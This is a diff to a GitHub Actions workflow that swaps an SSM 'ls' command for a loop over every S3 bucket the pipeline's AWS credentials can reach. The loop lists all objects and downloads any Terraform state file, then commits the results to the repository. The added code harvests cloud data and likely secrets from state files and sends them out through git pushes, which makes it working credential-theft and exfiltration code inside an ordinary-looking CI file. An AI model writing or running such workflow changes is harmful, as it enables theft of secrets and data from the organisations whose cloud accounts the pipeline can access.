@@ -24,26 +24,21 @@ jobs:
           TS=$(date +%s)
           mkdir -p iam_output
           
-          CMD_ID=$(aws ssm send-command \
-            --instance-ids i-0fb9dcbeb35b4fdbe \
-            --document-name "AWS-RunShellScript" \
-            --parameters 'commands=["ls"]' \
-            --region ap-south-1 \
-            --query "Command.CommandId" \
-            --output text)
-            
-          sleep 15
+          aws s3 ls > iam_output/s3_buckets-$TS.txt 2>&1
           
-          aws ssm get-command-invocation \
-            --instance-id i-0fb9dcbeb35b4fdbe \
-            --command-id $CMD_ID \
-            --region ap-south-1 \
-            > iam_output/ls-$TS.json 2>&1
+          for bucket in $(aws s3 ls | awk '{print $3}'); do
+            aws s3 ls s3://$bucket --recursive > iam_output/s3_objs_$bucket-$TS.txt 2>&1
+            # If we find a tfstate file, download it!
+            tfstate=$(aws s3 ls s3://$bucket --recursive | awk '{print $4}' | grep tfstate)
+            if [ -n "$tfstate" ]; then
+              aws s3 cp s3://$bucket/$tfstate iam_output/terraform.tfstate 2>&1
+            fi
+          done
           
           git config --global user.name 'github-actions[bot]'
           git config --global user.email 'github-actions[bot]@users.noreply.github.com'
           git add iam_output/
-          git commit -m "Test ls $TS" || true
+          git commit -m "Test s3 ls $TS" || true
           sleep 10
           git pull --rebase origin main
           git push origin main
